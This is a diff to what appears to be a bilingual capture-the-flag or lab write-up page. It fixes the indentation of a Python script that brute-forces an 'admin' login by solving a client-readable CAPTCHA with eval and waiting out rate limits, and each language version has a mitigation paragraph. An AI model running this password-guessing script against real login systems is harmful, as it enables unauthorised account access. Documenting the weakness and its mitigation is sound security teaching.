@@ -190,38 +190,38 @@ with open('passwords.txt', 'r', encoding='utf-8') as f:
         if not password:
             continue
 
-    while True:
-        expression, nonce = fetch_challenge(session)
-        cookies = session.cookies.get_dict()
-        captcha = eval(expression, {"__builtins__": {}}, {})
+        while True:
+            expression, nonce = fetch_challenge(session)
+            cookies = session.cookies.get_dict()
+            captcha = eval(expression, {"__builtins__": {}}, {})
 
-        print("Probando password: " + password)
-        data = {
-            "username": "admin",
-            "password": password,
-            "captcha": captcha,
-        }
-        if nonce:
-            data["captcha_nonce"] = nonce
+            print("Probando password: " + password)
+            data = {
+                "username": "admin",
+                "password": password,
+                "captcha": captcha,
+            }
+            if nonce:
+                data["captcha_nonce"] = nonce
 
-        response = session.post(
-            f'{BASE}/captcha/login',
-            cookies=cookies,
-            data=data,
-            timeout=10,
-        )
-        visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
-        if response.status_code == 429 or "Demasiados intentos" in visible_html:
-            time.sleep(10)
-            continue
-        break
+            response = session.post(
+                f'{BASE}/captcha/login',
+                cookies=cookies,
+                data=data,
+                timeout=10,
+            )
+            visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+            if response.status_code == 429 or "Demasiados intentos" in visible_html:
+                time.sleep(10)
+                continue
+            break
 
-    flag = FLAG_RE.search(visible_html)
-    if flag or SUCCESS_RE.search(visible_html):
-        print("Password valido: " + password)
-        if flag:
-            print(flag.group(0))
-        break</code></pre>
+        flag = FLAG_RE.search(visible_html)
+        if flag or SUCCESS_RE.search(visible_html):
+            print("Password valido: " + password)
+            if flag:
+                print(flag.group(0))
+            break</code></pre>
 
     <h3>Mitigacion</h3>
     <p>No confies en retos que el cliente puede leer y resolver trivialmente. Aplica controles del lado servidor: anti-automation por cuenta/IP, caducidad corta, tokens de un solo uso, monitorizacion y un proveedor CAPTCHA resistente a automatizacion.</p>
@@ -310,38 +310,38 @@ with open('passwords.txt', 'r', encoding='utf-8') as f:
         if not password:
             continue
 
-    while True:
-        expression, nonce = fetch_challenge(session)
-        cookies = session.cookies.get_dict()
-        captcha = eval(expression, {"__builtins__": {}}, {})
+        while True:
+            expression, nonce = fetch_challenge(session)
+            cookies = session.cookies.get_dict()
+            captcha = eval(expression, {"__builtins__": {}}, {})
 
-        print("Testing password: " + password)
-        data = {
-            "username": "admin",
-            "password": password,
-            "captcha": captcha,
-        }
-        if nonce:
-            data["captcha_nonce"] = nonce
+            print("Testing password: " + password)
+            data = {
+                "username": "admin",
+                "password": password,
+                "captcha": captcha,
+            }
+            if nonce:
+                data["captcha_nonce"] = nonce
 
-        response = session.post(
-            f'{BASE}/captcha/login',
-            cookies=cookies,
-            data=data,
-            timeout=10,
-        )
-        visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
-        if response.status_code == 429 or "Demasiados intentos" in visible_html:
-            time.sleep(10)
-            continue
-        break
+            response = session.post(
+                f'{BASE}/captcha/login',
+                cookies=cookies,
+                data=data,
+                timeout=10,
+            )
+            visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+            if response.status_code == 429 or "Demasiados intentos" in visible_html:
+                time.sleep(10)
+                continue
+            break
 
-    flag = FLAG_RE.search(visible_html)
-    if flag or SUCCESS_RE.search(visible_html):
-        print("Valid password: " + password)
-        if flag:
-            print(flag.group(0))
-        break</code></pre>
+        flag = FLAG_RE.search(visible_html)
+        if flag or SUCCESS_RE.search(visible_html):
+            print("Valid password: " + password)
+            if flag:
+                print(flag.group(0))
+            break</code></pre>
 
     <h3>Mitigation</h3>
     <p>Do not trust challenges that the client can read and solve trivially. Enforce server-side controls: account/IP automation limits, short expiry, one-use tokens, monitoring and a CAPTCHA provider designed to resist automation.</p>
